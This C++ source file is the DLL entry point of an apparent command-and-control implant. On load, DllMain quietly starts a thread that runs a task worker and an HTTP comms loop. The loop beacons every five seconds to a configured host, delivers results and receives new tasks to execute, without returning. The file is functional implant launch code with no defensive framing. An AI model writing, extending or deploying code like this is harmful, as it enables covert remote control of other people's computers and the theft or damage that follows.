#include <Windows.h>
#include <thread>
#include "Agent.h"
#include "HTTPCommunicationModule.h"
#include "AgentConfig.h"

// Entry point for the agent logic, runs on a dedicated thread so DllMain
// returns immediately and does not hold the loader lock.
static DWORD WINAPI AgentThread(LPVOID) {
    Agent agent;

    // Worker thread: dequeues tasks and executes them.
    std::thread workerThread(&Agent::Work, &agent);
    workerThread.detach();

    // Comms loop: beacons every 5 s, delivers results, receives new tasks.
    // Start() never returns under normal operation.
    HTTPCommunicationModule comm(GetAgentHost(), GetAgentPort(), agent);
    comm.Config();
    comm.Start();

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Suppress DLL_THREAD_ATTACH / DLL_THREAD_DETACH notifications to
        // avoid re-entering DllMain for every thread spawned by the agent.
        DisableThreadLibraryCalls(hinstDLL);

        HANDLE hThread = CreateThread(NULL, 0, AgentThread, NULL, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}
